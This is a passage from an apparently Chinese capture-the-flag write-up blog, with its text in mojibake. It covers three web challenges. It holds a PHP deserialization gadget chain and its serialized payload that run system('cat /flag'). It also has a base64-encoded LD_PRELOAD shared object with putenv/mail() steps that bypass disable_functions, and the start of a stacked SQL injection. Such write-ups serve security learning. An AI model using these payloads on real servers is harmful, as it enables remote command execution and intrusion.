class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$ob</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="variable">$ob2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arggg</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil, <span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span>-&gt;make([<span class="string">&#x27;close&#x27;</span> =&gt; [<span class="keyword">new</span> C, <span class="string">&#x27;evallll&#x27;</span>]]);</span><br><span class="line"><span class="variable">$a</span>-&gt;make(<span class="variable">$b</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„payloadä¸º: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sssssss&#x3D;O:1:&quot;A&quot;:1:&#123;s:4:&quot;data&quot;;O:1:&quot;B&quot;:1:&#123;s:5:&quot;cache&quot;;a:1:&#123;s:5:&quot;close&quot;;a:2:&#123;i:0;O:1:&quot;C&quot;:2:&#123;s:4:&quot;evil&quot;;s:6:&quot;system&quot;;s:5:&quot;arggg&quot;;s:9:&quot;cat &#x2F;flag&quot;;&#125;i:1;s:7:&quot;evallll&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><a name='6'></a></p><h2 id="åˆä¸€ä¸ªåé—¨"><a href="#åˆä¸€ä¸ªåé—¨" class="headerlink" title="åˆä¸€ä¸ªåé—¨"></a>åˆä¸€ä¸ªåé—¨</h2><p>è¿™é¢˜åšçš„æ—¶å€™å‘ç”Ÿäº†ä»¶å°è¶£äº‹(<del>å½“ç„¶ä¸æ˜¯æŒ‡å‰äºŒè¡€çš„å¤§ä½¬åœ¨/tmpä¸‹é¢æäº‹æƒ…å•¦.ä¹Ÿä¸æ˜¯æŒ‡ä¸Šä¸€ä¸ªå¤§ä½¬åšå®Œäº†é¢˜è¿soæ–‡ä»¶éƒ½æ²¡æœ‰åˆ å•¦.æ›´ä¸æ˜¯æŒ‡è‡ªå·±åšå®Œäº†è¿˜å¿˜è®°æŠŠflagæ–‡ä»¶ç»™æ¸…ç†æ‰.</del></p><p>çœ‹äº†ä¸‹phpinfo(), å‘ç°èƒ½æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°éƒ½è¢«banæ‰äº†.</p><p>åˆ©ç”¨scandir()å‡½æ•°æœç´¢ç½‘ç«™ç›®å½•.å‘ç°æœ‰tmpæ–‡ä»¶å¤¹, å°è¯•ä¸Šä¼ æ–‡ä»¶å‘ç°å¯è¡Œ.</p><p>æƒ³äº†æƒ³æ˜¯å¦å­˜åœ¨ç»•è¿‡disable_functionsçš„æ¼æ´å‘¢?ç¿»äº†ç¿»ç™¾åº¦, æ‰¾åˆ°ä¸€ä¸ªåœ¨Githubä¸Šçš„åˆ©ç”¨LD_PRELOADæ¼æ´ç»•è¿‡disable_functionsçš„é¡¹ç›®.<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">é™„ä¸Šé“¾æ¥</a></p><p>å…·ä½“åŸç†<strong>æ˜¯åˆ©ç”¨LD_PRELOADçš„ç‰¹ç‚¹,å®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼Œå®ƒå…è®¸åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½ç”¨æˆ·å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“, è¿™æ ·å°±å¯ä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“, è°ƒç”¨ä¸€äº›è¢«bançš„å‡½æ•°.</strong>(æœ‰ç†è§£çš„ä¸å¯¹çš„å¤§ä½¬è¯·åŠ¡å¿…å‘Šè¯‰æˆ‘!!!</p><p>æ‰€ä»¥æ ¹æ®githubä¸Šé¢çš„README.MDä¸€æ­¥ä¸€æ­¥çš„åšå°±è¡Œäº†</p><h3 id="1-å…ˆä¸Šä¼ ä¸€ä¸ªbypass-disablefunc-x64-so"><a href="#1-å…ˆä¸Šä¼ ä¸€ä¸ªbypass-disablefunc-x64-so" class="headerlink" title="1. å…ˆä¸Šä¼ ä¸€ä¸ªbypass_disablefunc_x64.so"></a>1. å…ˆä¸Šä¼ ä¸€ä¸ªbypass_disablefunc_x64.so</h3><p>ç”±äºsoæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶, æ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™è€ƒè™‘å…ˆbase64ç¼–ç , ä¼ ä¸Šå»ç”¨phpè‡ªå¸¦çš„å‡½æ•°è§£ç ,ä¸‹é¢æ˜¯å½“æ—¶åšé¢˜çš„payload(å¯èƒ½ä¼šæœ‰ç‚¹é•¿hhh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/var/tmp&#x27;</span>));<span class="variable">$a</span>=<span class="string">&#x27;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AAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA&#x27;</span>;var_dump(file_put_contents(<span class="string">&#x27;/var/tmp/helloworld.so&#x27;</span>,base64_decode(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><h3 id="2-åˆ©ç”¨soæ–‡ä»¶ç»•è¿‡è¢«bançš„å‡½æ•°"><a href="#2-åˆ©ç”¨soæ–‡ä»¶ç»•è¿‡è¢«bançš„å‡½æ•°" class="headerlink" title="2. åˆ©ç”¨soæ–‡ä»¶ç»•è¿‡è¢«bançš„å‡½æ•°"></a>2. åˆ©ç”¨soæ–‡ä»¶ç»•è¿‡è¢«bançš„å‡½æ•°</h3><p>æŠŠsoæ–‡ä»¶ä¼ ä¸Šå»åå…¶å®å¯ä»¥ç»§ç»­ä¼ é¡¹ç›®é‡Œçš„é‚£ä¸ªphpçš„, ä¸è¿‡è¿˜æ˜¯æƒ³è¯•è¯•èƒ½ä¸èƒ½ç›´æ¥åœ¨payloadé‡Œé¢å®ç°.</p><p>å…¶å®ä¹Ÿä¸éš¾, å…ˆè®¾ç½®éœ€è¦æ‰§è¡Œçš„å‘½ä»¤<code>/readflag &gt; /var/tmp/K1rit0</code>, å†è®¾ç½®ç¯å¢ƒå˜é‡LD_PRELOADçš„å€¼ä¸ºåˆšåˆšä¼ ä¸Šå»çš„helloworld.so, ç„¶åè°ƒç”¨mail(). è¿™ä¸ªæ—¶å€™å°±ä¼šå†/tmpä¸‹ç”Ÿæˆä¸€ä¸ªK1rit0, é‡Œé¢å°±æ˜¯/readflagçš„ç»“æœäº†!</p><p>æ‰€ä»¥payloadä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(putenv(<span class="string">&quot;EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0&quot;</span>));var_dump(putenv(<span class="string">&quot;LD_PRELOAD=/var/tmp/helloworld.so&quot;</span>));var_dump(mail(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>));var_dump(file_get_contents(<span class="string">&#x27;/var/tmp/K1rit0&#x27;</span>));</span><br></pre></td></tr></table></figure><p><a name='7'></a></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-18a14a4782f849fe8a713ba563b6d543.png" alt="å›¾ç‰‡.png"><br>çœŸçš„å¾ˆbaby, queryè¯­å¥ç›´æ¥ç»™å‡ºæ¥äº†.å‚è€ƒè‡ªå·±çš„å¦å¤–ä¸€ä¸ªå‘å°±èƒ½åšäº†<a href="http://47.98.130.190:8090/archives/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E7%BB%8F%E9%AA%8C%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0">æŸç¯‡sqlæ€»ç»“</a></p><p>å½“æ—¶æƒ³éƒ½æ²¡æƒ³ç›´æ¥å †å æ³¨å…¥äº†(ä»¥è‡³äºä»¥ä¸ºè¿™é¢˜è¿‡æ»¤éƒ½æ²¡æœ‰,å…¶å®selectè¿™äº›è¿˜æ˜¯è¢«è¿‡æ»¤æ‰äº†çš„<br><code>1&#39;;show databases;show 